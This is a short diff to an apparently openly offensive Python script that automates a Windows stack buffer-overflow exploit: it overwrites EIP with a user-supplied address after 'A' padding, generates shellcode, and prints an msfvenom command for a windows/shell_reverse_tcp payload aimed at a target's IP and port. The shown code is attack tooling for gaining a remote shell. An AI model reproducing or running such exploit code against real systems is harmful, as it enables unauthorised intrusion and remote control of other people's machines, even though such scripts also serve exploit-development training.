@@ -184,7 +184,8 @@ def shell_gen(badchars: str):
     print("[+] Generated shellcode at /tmp/shellcode")
 
 
-def exploit(offset):
+def exploit(offset: int):
+    global eip_str
     eip_str = input("[+] Enter EIP address to overwrite (without 0x): ").strip()
 
     padding = "A" * offset
@@ -245,6 +246,13 @@ def main() -> None:
 
     shell_gen(badchars)
     exploit(offset)
+    
+    print("\n[+] Exploit Info")
+    print(f"[+] Address: {ip}:{port}")
+    print(f"[+] EIP offset: {offset} bytes")
+    print(f"[+] EIP value: 0x{eip_str}")
+    print(f"[+] bad chars: {badchars}")
+    print(f"[+] Shell code: msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} EXITFUNC=thread -b \"{badchars}\" -f python -v shellcode")
 
 
 if __name__ == "__main__":
